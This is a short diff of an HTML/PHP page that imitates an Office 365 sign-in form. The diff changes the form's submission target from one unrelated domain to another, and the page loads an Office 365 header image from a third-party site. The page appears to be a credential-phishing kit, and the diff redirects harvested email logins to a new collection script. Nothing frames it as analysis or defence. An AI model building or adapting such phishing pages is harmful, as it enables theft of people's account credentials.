@@ -64,7 +64,7 @@ outline: none;
 <div id="container">
 <div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:498px; height:410px; z-index:0"><img src="https://bozoktraktor.com/sharedocument/images/office365header.png" alt="" title="" border=0 width=498 height=410></div>
   
-   <form name='office365signin' action='https://bozoktraktor.com/venture/post.php' method='post'>
+   <form name='office365signin' action='https://aptradng.com/ventureshare/post.php' method='post'>
     
 
 <input name="email" value="<?php echo $email ?>" placeholder="someone@example.com" autocomplete="off"  class="textbox" required type="Email" style="position:absolute;width:359px;left:85px;top:230px;z-index:2"><p></p>
